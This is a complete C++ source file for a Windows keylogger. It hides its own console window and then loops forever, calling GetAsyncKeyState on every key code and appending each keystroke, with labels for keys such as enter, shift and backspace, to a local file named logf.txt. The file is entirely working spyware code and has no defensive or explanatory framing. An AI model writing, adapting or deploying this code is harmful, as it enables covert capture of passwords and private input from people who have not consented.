#include<iostream>
#include<fstream>
#include<windows.h>
#include<winuser.h>

using namespace std;

void tryLogging();

int main(){
     ShowWindow(GetConsoleWindow(),SW_HIDE);//to hide console window
    tryLogging();
}

void tryLogging(){
    char i;
    while(true){
        for(i=0;i<=254;i++){
            if(GetAsyncKeyState(i) & 0x1){
              ofstream logf;
              logf.open("logf.txt",ios::app);//opens a file for logging
              switch(i){
                case VK_BACK:
                     logf<<"[backspace]";
                     break;
                case VK_SPACE:
                     logf<<" ";//for spacebar
                     break;
                case VK_RETURN:
                     logf<<"[enter]";
                     break;
                case VK_SHIFT:
                     logf<<"[shift]";
                     break;
                case VK_CONTROL:
                     logf<<"[control]";
                     break;
                case VK_CAPITAL:
                     logf<<"[cap]";
                     break;
                case VK_TAB:
                     logf<<"[tab]";
                     break;
                case VK_MENU:
                     logf<<"[alt]";
                case VK_LBUTTON:
                case VK_RBUTTON:
                     break;
                default:
                    logf<<i;

              }
            }
        }
    }
}